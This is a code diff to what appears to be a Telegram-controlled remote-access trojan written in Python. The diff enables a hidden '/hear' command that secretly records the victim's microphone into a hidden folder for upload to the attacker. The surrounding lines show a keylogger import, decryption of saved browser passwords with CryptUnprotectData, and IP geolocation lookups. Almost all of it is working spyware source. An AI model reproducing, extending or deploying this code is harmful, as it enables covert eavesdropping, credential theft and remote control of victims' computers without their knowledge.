@@ -23,7 +23,7 @@ import datetime											# /schedule
 import time
 import threading 										# /proxy, /schedule
 import proxy
-#import pyaudio, wave 									# /hear
+import pyaudio, wave 									# /hear
 import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import pyHook, pythoncom 								# keylogger
@@ -338,40 +338,40 @@ def handle(msg):
                                         response += 'Password: ' + str(win32crypt.CryptUnprotectData(users[2], None, None, None, 0)) + '\n\n'
                                 # """
                                 # pass
-                        #elif command.startswith('/hear'):
-                        #        SECONDS = -1
-                        #        try:
-                        #                SECONDS = int(command.replace('/hear','').strip())
-                        #        except:
-                        #                SECONDS = 5
-                        #         
-                        #        CHANNELS = 2
-                        #        CHUNK = 1024
-                        #        FORMAT = pyaudio.paInt16
-                        #        RATE = 44100
-                        #         
-                        #        audio = pyaudio.PyAudio()
-                        #        bot.sendChatAction(chat_id, 'typing')
-                        #        stream = audio.open(format=FORMAT, channels=CHANNELS,
-                        #                                        rate=RATE, input=True,
-                        #                                        frames_per_buffer=CHUNK)
-                        #        frames = []
-                        #        for i in range(0, int(RATE / CHUNK * SECONDS)):
-                        #                data = stream.read(CHUNK)
-                         #               frames.append(data)
-                         #       stream.stop_stream()
-                        #        stream.close()
-                        #        audio.terminate()
-                        #        
-                         #       wav_path = hide_folder + '\\mouthlogs.wav'
-                        #        waveFile = wave.open(wav_path, 'wb')
-                        #        waveFile.setnchannels(CHANNELS)
-                        #        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
-                        #        waveFile.setframerate(RATE)
-                        #        waveFile.writeframes(b''.join(frames))
-                        #        waveFile.close()
-                        #        bot.sendChatAction(chat_id, 'upload_document')
-                        #        #bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
+                        elif command.startswith('/hear'):
+                                SECONDS = -1
+                                try:
+                                        SECONDS = int(command.replace('/hear','').strip())
+                                except:
+                                        SECONDS = 5
+                                 
+                                CHANNELS = 2
+                                CHUNK = 1024
+                                FORMAT = pyaudio.paInt16
+                                RATE = 44100
+                                 
+                                audio = pyaudio.PyAudio()
+                                bot.sendChatAction(chat_id, 'typing')
+                                stream = audio.open(format=FORMAT, channels=CHANNELS,
+                                                                rate=RATE, input=True,
+                                                                frames_per_buffer=CHUNK)
+                                frames = []
+                                for i in range(0, int(RATE / CHUNK * SECONDS)):
+                                        data = stream.read(CHUNK)
+                                        frames.append(data)
+                                stream.stop_stream()
+                                stream.close()
+                                audio.terminate()
+                                
+                                wav_path = hide_folder + '\\mouthlogs.wav'
+                                waveFile = wave.open(wav_path, 'wb')
+                                waveFile.setnchannels(CHANNELS)
+                                waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+                                waveFile.setframerate(RATE)
+                                waveFile.writeframes(b''.join(frames))
+                                waveFile.close()
+                                bot.sendChatAction(chat_id, 'upload_document')
+                                #bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
                         elif command == '/ip_info':
                                 bot.sendChatAction(chat_id, 'find_location')
                                 info = requests.get('http://ipinfo.io').text #json format
